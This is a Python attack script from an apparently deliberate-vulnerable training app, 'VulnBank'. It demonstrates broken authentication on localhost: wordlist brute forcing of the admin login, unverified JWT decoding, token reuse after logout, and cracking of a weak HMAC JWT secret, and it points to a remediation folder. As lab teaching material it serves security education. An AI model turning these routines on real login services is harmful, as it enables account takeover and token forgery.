#!/usr/bin/env python3
"""
===================================================
VulnBank — Attack Script #3: Broken Authentication
===================================================
⚠️  FOR EDUCATIONAL / AUTHORIZED USE ONLY

Demonstrates:
  1. Brute force login (no rate limiting)
  2. JWT decode — reveals no expiration
  3. Token reuse after "logout"
  4. Weak secret cracking
"""

import requests
import json
import base64
import sys
import time
import hmac
import hashlib

BASE_URL = "http://localhost:8080"

GREEN  = "\033[92m"
RED    = "\033[91m"
YELLOW = "\033[93m"
BLUE   = "\033[94m"
BOLD   = "\033[1m"
RESET  = "\033[0m"

# Common passwords for brute force demo
WORDLIST = [
    "password", "123456", "admin", "admin123", "letmein",
    "qwerty", "welcome", "monkey", "dragon", "master",
    "shadow", "sunshine", "princess", "football", "iloveyou",
    "trustno1", "password1", "123456789", "12345678", "1234567",
    "passw0rd", "login", "hello", "test", "secret"
]


def banner():
    print(f"""
{BLUE}╔══════════════════════════════════════════╗
║   BROKEN AUTH ATTACK DEMO                ║
║   VulnBank — Educational Use Only        ║
╚══════════════════════════════════════════╝{RESET}
""")


def decode_jwt(token: str) -> dict:
    """Decode JWT without verification (just base64 decode)."""
    try:
        parts = token.split('.')
        # Pad base64
        header_b64  = parts[0] + '=' * (4 - len(parts[0]) % 4)
        payload_b64 = parts[1] + '=' * (4 - len(parts[1]) % 4)
        header  = json.loads(base64.b64decode(header_b64))
        payload = json.loads(base64.b64decode(payload_b64))
        return {"header": header, "payload": payload}
    except Exception as e:
        return {"error": str(e)}


def attack_brute_force(target_username: str = "admin"):
    """
    Brute force login — no rate limiting means unlimited attempts.
    """
    print(f"{BOLD}[1] Brute Force Attack — target: {target_username}{RESET}")
    print(f"    Wordlist size: {len(WORDLIST)} passwords")
    print(f"    No rate limiting → unlimited speed\n")

    start = time.time()
    cracked = None

    for i, password in enumerate(WORDLIST):
        resp = requests.post(
            f"{BASE_URL}/api/auth/login",
            json={"username": target_username, "password": password},
            timeout=5
        )

        if resp.status_code == 200 and "token" in resp.json():
            elapsed = time.time() - start
            cracked = (password, resp.json())
            print(f"    {GREEN}✅ CRACKED in {elapsed:.2f}s — password: '{password}'{RESET}")
            print(f"    Attempts: {i+1} / {len(WORDLIST)}")
            break
        else:
            print(f"    [{i+1:>2}] '{password}' — failed")
            time.sleep(0.05)  # small delay to not overwhelm local server

    if not cracked:
        print(f"    {YELLOW}⚠  Password not in wordlist — try a larger dictionary{RESET}")
    print()
    return cracked


def attack_jwt_analysis(token: str):
    """
    Decode the JWT and expose the missing 'exp' claim.
    """
    print(f"{BOLD}[2] JWT Analysis — No Expiration{RESET}")

    decoded = decode_jwt(token)
    header  = decoded.get("header", {})
    payload = decoded.get("payload", {})

    print(f"    Header:  {json.dumps(header, indent=2).replace(chr(10), chr(10)+'    ')}")
    print(f"    Payload: {json.dumps(payload, indent=2).replace(chr(10), chr(10)+'    ')}")

    if "exp" not in payload:
        print(f"\n    {RED}⚠️  NO 'exp' (expiration) CLAIM FOUND!{RESET}")
        print(f"    {RED}   This token is valid FOREVER.{RESET}")
    else:
        print(f"\n    {GREEN}ℹ  Expiration: {payload['exp']}{RESET}")

    print()


def attack_token_reuse(token: str):
    """
    Demonstrate that a "logged out" token still works.
    Without server-side revocation, JWTs stay valid after logout.
    """
    print(f"{BOLD}[3] Token Reuse After Logout{RESET}")
    print(f"    Simulating logout (client-side only — token not invalidated server-side)")

    # "Logout" is just forgetting the token client-side
    print(f"    User 'logs out' (token deleted from localStorage)")
    print(f"    Re-using the old token...")

    resp = requests.get(
        f"{BASE_URL}/api/auth/validate",
        headers={"Authorization": f"Bearer {token}"}
    )

    if resp.status_code == 200 and resp.json().get("valid"):
        data = resp.json()
        print(f"    {RED}✅ Token STILL VALID after logout!{RESET}")
        print(f"    Validated as: {data.get('username')} / {data.get('role')}")
    else:
        print(f"    Token rejected: {resp.json()}")
    print()


def attack_weak_secret_crack(token: str):
    """
    Try to crack the JWT signature with common secrets.
    Demonstrates why a strong secret is critical.
    """
    print(f"{BOLD}[4] Weak Secret Cracking{RESET}")
    print(f"    Trying common secrets to forge tokens...\n")

    common_secrets = [
        "secret", "secret123", "password", "jwt_secret",
        "myapp", "changeme", "supersecret", "key", "12345"
    ]

    parts = token.split('.')
    message = f"{parts[0]}.{parts[1]}".encode()
    original_sig = parts[2]

    for secret in common_secrets:
        # Compute HMAC-SHA256
        computed = base64.urlsafe_b64encode(
            hmac.new(secret.encode(), message, hashlib.sha256).digest()
        ).rstrip(b'=').decode()

        match = (computed == original_sig)
        status = f"{RED}✅ MATCH — Secret is: '{secret}'{RESET}" if match else f"✗  '{secret}'"
        print(f"    {status}")

        if match:
            print(f"\n    {RED}⚠️  JWT secret cracked! Attacker can now forge any token.{RESET}")
            break
    print()


if __name__ == "__main__":
    banner()
    print(f"Target: {BASE_URL}\n")

    try:
        requests.get(BASE_URL, timeout=3)
    except Exception:
        print(f"{RED}❌ Cannot connect to {BASE_URL}")
        print(f"   Start the app: docker-compose up{RESET}")
        sys.exit(1)

    # Step 1: Brute force
    result = attack_brute_force("admin")

    if result:
        password, data = result
        token = data["token"]

        # Step 2: Analyze token
        attack_jwt_analysis(token)

        # Step 3: Test token reuse
        attack_token_reuse(token)

        # Step 4: Crack the secret
        attack_weak_secret_crack(token)
    else:
        print(f"{YELLOW}Getting a token via direct login for analysis...{RESET}")
        resp = requests.post(
            f"{BASE_URL}/api/auth/login",
            json={"username": "alice", "password": "password1"}
        )
        if resp.ok:
            token = resp.json()["token"]
            attack_jwt_analysis(token)
            attack_weak_secret_crack(token)

    print(f"{BLUE}{'='*50}")
    print(f"See /fixes/03_auth_fix for remediation code.{RESET}")
